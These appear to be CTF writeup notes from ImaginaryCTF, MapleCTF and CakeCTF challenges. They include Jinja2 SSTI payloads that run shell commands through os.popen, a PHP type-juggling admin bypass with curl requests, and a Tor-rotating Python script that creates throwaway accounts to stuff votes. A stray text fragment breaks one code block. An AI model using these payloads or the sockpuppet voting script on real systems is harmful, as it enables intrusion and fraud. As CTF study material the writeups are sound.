# Writeups And Cheatsheets

##Cheatsheets

###SSTI Cheatsheets
https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
[Common object/var names added in a template (for fuzzing) use Burp or Zap](https://raw.githubusercontent.com/albinowax/SecLists/9309803f3f7d5c1e0b2f26721c1ea7ef36eeb1c8/Discovery/Web_Content/burp-parameter-names)
[Filter Evasion](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

##Writeups

###Sequel_Sequel (SFTP Jail)
There was an SFTP server on which there were configs for mysql. MySQL was running locally and we couldnt access it from the outside. To access it we would use SSH for port forwarding. But SSH was configured not to allow commands to be sent, so to prevent an error we passed -N flag. -L flag for port forwarding.

```$ ssh -p 42022 -N -L 3306:127.0.0.1:3306 ethan@chal.imaginaryctf.org```

###Democracy (Tor Web Challenge)
BTW Tor was not the intended solution.
We needed to cast votes with a unique IP and unique account in this challenge to our account to have the highest votes to our account. This was done by automating creating of tor sessions in python 15 times in the script and sending requests with random accounts (created every time in the loop)
```python
from stem import Signal
from stem.control import Controller
import requests
import random
import string
import time
CHARS = string.ascii_letters + string.digits
def get_random_string(length):
    # choose from all lowercase letter
    result_str = ''.join(random.choice(CHARS) for i in range(length))
    return result_str
def get_tor_session():
    session = requests.session()
    # Tor uses the 9050 port as the default socks port
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session
for i in range(15):
  s = get_tor_session()
  s.post("http://chal.imaginaryctf.org:1339/register", data={"user": f"{get_random_string(5)}", "pass": f"{get_random_string(5)}"})
  vote = s.get("http://chal.imaginaryctf.org:1339/vote/9926a39e3fde47ab9aee5a69c3e76858")
  print(vote.content)
  with Controller.from_port(port = 9051) as controller:
      controller.authenticate()
      controller.signal(Signal.NEWNYM)
  
  time.sleep(5)
```

Additionally you would have to install tor(obviously) and change torrc configuration file in /etc/tor/torrc:
Uncomment the following:

```
#ControlPort 9051
#CookieAuthentication 1
```


Then
```bash
sudo service tor start
pip3 install stem
```

###SSTI Golf
Source Code:
```python
#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route('/')
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'
    if len(query) > 49:
        return "Too long!"
    return render_template_string(query)

app.run('0.0.0.0', 1337)
```

Still confused how to do that. Play around with different injections. Check Jinja docs, blogs, and ssti tutorials. People suggest updating config variable. Check {{config}}:

Other blogs suggest hacking Python object tree to import module. Watch helpful youtube video ('Server-Side Template Injections Explained' by PwnFunction). They suggest accessing Python os module through url_for global object:
```javascript
const payload = `{{lipsum.__globals__.os.popen('cat an_arbitrarily_named_file').read()}}`
```

Too long!
```javascript
// sstigolf.ts
// STEP 1: Update config variable with partial payload

// partialPayload
const bindPayloadToConfig = async () => {
    const partialPayload = `cat an_arbitrarily_named_file`;
    // 'p' for 'payload'
    const payloadKey = 'p';
    // query tells server to get value from url parameter 'p' and store it in Flask config variable
    const query = `{{config.update(${payloadKey}=request.args.get('${payloadKey}'))}}`;
    // Make GET request with two url parameters, 'p' and 'query'
    const targetURL = new URL(`https://sstigolf.ictf2022.iciaran.com/ssti?${payloadKey}=${partialPayload}&query=${query}`);
    const response = await fetch(targetURL);
    // If all went well, we should not get a server error
    const responseText = await response.text();
    console.log({responseText});
}

bindPayloadToConfig();
// sstigolf.ts
// STEP 2: Reconstruct full payload and get flag

const runPayload = async (payloadKey: string) => {
    // query that constructs and executes full payload
    const query = `{{lipsum.__globals__.os.popen(config.${payloadKey}).read()}}`;
    // Make GET request, this time with just `query` url parameter
    const targetURL = new URL(`https://sstigolf.ictf2022.iciaran.com/ssti?query=${query}`);
    const flag = await fetch(targetURL);
    // If all went well, we should get flag!
    const flagText = await flag.text();
    console.log({flagText});
}
// Wait a few seconds for server to update with partial payload
setTimeout(() => runPayload(payloadKey), 3000);
```

Breakdown of query:
```python
// Jinja template tags. This tricks server into evaluating content between brackets 
{{}}
// `lipsum` is global variable available in Flask applications. Use it to navigate to Python os module
{{lipsum.__globals__.os}
// Use os.popen to run terminal commands.
{{lipsum.__globals__.os.popen()}}
// Run command `cat an_arbitrarily_named_file` that we previously attached to `config` dictionary under the key 'p'
{{lipsum.__globals__.os.popen(config.p)}}
// Normally os.popen outputs to standard out, but we want the server to insert the output of `cat an_arbitrarily_named_file`, i.e. the flag, into the response that we get in our browser. We do this with the `.read()` method 
{{lipsum.__globals__.os.popen(config.p).read()}}
```

Intended Solution:
```{{cycler.next.__globals__.os.popen('nl *')|max}}```


Best Solution (You can use nl instead of cat here):
```python
// 47 character solution
{{lipsum.__globals__.os.popen('cat *').read()}}
```

nl takes the lines of the file in the stdin and outputs the lines with their respective number in the stdout.

###Honksay (MapleCTF)

Some Assembly Required (Deobfuscation and wasm challenge)
We used jsnice.org for deobfuscating… Highly recommended.
Deobfuscated js:
```javascript
'use strict';
const _0x402c = ["value", "2wfTpTR", "instantiate", "275341bEPcme", "innerHTML", "1195047NznhZg", "1qfevql", "input", "1699808QuoWhA", "Correct!", "check_flag", "Incorrect!", "./JIFxzHyW8W", "23SMpAuA", "802698XOMSrr", "charCodeAt", "474547vVoGDO", "getElementById", "instance", "copy_char", "43591XxcWUl", "504454llVtzW", "arrayBuffer", "2NIQmVj", "result"];
const _0x4e0e = function(url, whensCollection) {
  /** @type {number} */
  url = url - 470;
  let _0x402c6f = _0x402c[url];
  return _0x402c6f;
};
(function(data, oldPassword) {
  const toMonths = _0x4e0e;
  for (; !![];) {
	try {
  	const userPsd = -parseInt(toMonths(491)) + parseInt(toMonths(493)) + -parseInt(toMonths(475)) * -parseInt(toMonths(473)) + -parseInt(toMonths(482)) * -parseInt(toMonths(483)) + -parseInt(toMonths(478)) * parseInt(toMonths(480)) + parseInt(toMonths(472)) * parseInt(toMonths(490)) + -parseInt(toMonths(485));
  	if (userPsd === oldPassword) {
    	break;
  	} else {
    	data["push"](data["shift"]());
  	}
	} catch (_0x41d31a) {
  	data["push"](data["shift"]());
	}
  }
})(_0x402c, 627907);
let exports;
(async() => {
  const findMiddlePosition = _0x4e0e;
  let leftBranch = await fetch(findMiddlePosition(489));
  let rightBranch = await WebAssembly[findMiddlePosition(479)](await leftBranch[findMiddlePosition(474)]());
  let module = rightBranch[findMiddlePosition(470)];
  exports = module["exports"];
})();
/**
 * @return {undefined}
 */
function onButtonPress() {
  const navigatePop = _0x4e0e;
  let params = document["getElementById"](navigatePop(484))[navigatePop(477)];
  for (let i = 0; i < params["length"]; i++) {
	exports[navigatePop(471)](params[navigatePop(492)](i), i);
  }
  exports["copy_char"](0, params["length"]);Donations and Gadgets g
  if (exports[navigatePop(487)]() == 1) {
	document[navigatePop(494)](navigatePop(476))[navigatePop(481)] = navigatePop(486);
  } else {
	document[navigatePop(494)](navigatePop(476))[navigatePop(481)] = navigatePop(488);
  }
}
;
```

We can use the developer tools to set navigatePop (any name would work) to global function ```_0x4e0e```. And you can use navigatePop in developer tools to figure out the results. Soon you will get the name of the wasm file and on using wabt tools you can easily find out the flag. Please try to understand how web assembly works as well.

###CakeGear

Code Snippet:
```php
define('ADMIN_PASSWORD', 'f365691b6e7d8bc4e043ff1b75dc660708c1040e');

/* Router login API */
$req = @json_decode(file_get_contents("php://input"));
if (isset($req->username) && isset($req->password)) {
    if ($req->username === 'godmode'
        && !in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) {
        /* Debug mode is not allowed from outside the router */
        $req->username = 'nobody';
    }

    switch ($req->username) {
        case 'godmode':
            /* No password is required in god mode */
            $_SESSION['login'] = true;
            $_SESSION['admin'] = true;
            break;

        case 'admin':
            /* Secret password is required in admin mode */
            if (sha1($req->password) === ADMIN_PASSWORD) {
                $_SESSION['login'] = true;
                $_SESSION['admin'] = true;
            }
            break;

        case 'guest':
            /* Guest mode (low privilege) */
            if ($req->password === 'guest') {
                $_SESSION['login'] = true;
                $_SESSION['admin'] = false;
            }
            break;
    }

    /* Return response */
    if (isset($_SESSION['login']) && $_SESSION['login'] === true) {
        echo json_encode(array('status'=>'success'));
        exit;
    } else {
        echo json_encode(array('status'=>'error'));
        exit;
    }
}
```


As it is clear we need to make a request from localhost with godmode as the username to get access to admin privileges. However we can perform a simple type casting attack here by setting the username as true. This avoids the if statement but the switch statement takes it as a boolean variable and passes it to be true.
Result:
```bash
$ curl -X POST http://web1.2022.cakectf.com:8005/ --data '{"username":true,"password":""}' -v
~~~
< Set-Cookie: PHPSESSID=6cf678953e16999644a963f88b92cc13; path=/
~~~
{"status":"success"}
```
```bash
$ curl -X POST http://web1.2022.cakectf.com:8005/admin.php -H "Cookie: PHPSESSID=6cf678953e16999644a963f88b92cc13"
```
Result: 
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>control panel - CAKEGEAR</title>
        <style>table, td { margin: auto; border: 1px solid #000; }</style>
    </head>
    <body style="text-align: center;">
        <h1>Router Control Panel</h1>
        <table><tbody>
            <tr><td><b>Status</b></td><td>UP</td></tr>
            <tr><td><b>Router IP</b></td><td>192.168.1.1</td></tr>
            <tr><td><b>Your IP</b></td><td>192.168.1.7</td></tr>
            <tr><td><b>Access Mode</b></td><td>admin</td></tr>
            <tr><td><b>FLAG</b></td><td>CakeCTF{y0u_mu5t_c4st_2_STRING_b3f0r3_us1ng_sw1tch_1n_PHP}
</td></tr>
        </tbody></table>
    </body>
</html>


